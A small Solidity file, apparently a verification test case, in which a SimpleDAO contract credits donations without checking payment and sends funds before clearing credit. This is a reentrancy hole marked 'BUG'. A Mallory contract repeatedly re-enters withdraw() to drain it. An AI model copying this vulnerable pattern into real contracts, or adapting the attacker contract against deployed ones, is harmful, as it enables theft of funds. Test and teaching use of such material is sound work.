pragma solidity >=0.4.24<0.6.0;

contract SimpleDAO {
    mapping (address => uint) public credit;
    constructor() public {
    }
    function donate(address to, uint amount) payable public {
        credit[to] += amount;
    }
    function queryCredit(address to) public view returns (uint) {
        return credit[to];
    }
    function withdraw() public {
        uint oldBal = address(this).balance; 
        uint balSender = msg.sender.balance; // translated OK
        uint amount = credit[msg.sender];
        if (amount > 0) {
            msg.sender.transfer(amount); 
            credit[msg.sender] = 0;  // BUG: 
        }
        uint bal = address(this).balance;
        assert(bal == oldBal || bal == (oldBal - amount));
    }
}

contract Mallory {
    SimpleDAO public dao;
    uint count;
    constructor (address daoAddr) public payable {
        count = 0;
        dao = SimpleDAO(daoAddr);
        require(dao.queryCredit(address(this)) == 0);
        require(address(this).balance == 1);
    }
    function () payable external {
        if (count < 2) {
            count ++;
            dao.withdraw();
        }
    }
    function donate() public {        
        dao.donate(address(this), address(this).balance);  //should this not be a send(this.balance)? 
    }
    function getJackpot() public {
        dao.withdraw();
    }
}
